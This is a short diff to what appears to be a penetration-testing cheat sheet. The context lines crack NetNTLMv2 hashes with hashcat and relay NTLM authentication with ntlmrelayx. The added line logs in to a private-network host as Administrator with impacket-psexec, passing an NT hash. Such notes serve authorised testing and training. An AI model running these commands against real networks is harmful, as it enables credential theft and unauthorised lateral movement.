@@ -35,4 +35,6 @@ hashcat -m 5600 hash.txt wordlist.txt
 
 # Full relay + secrets dump in one go
 ntlmrelayx.py -tf targets.txt -smb2support -socks
+
+impacket-psexec -hashes :7c331519c975bba9f0aba84a99d003b0 Administrator@192.168.0.199
 ```
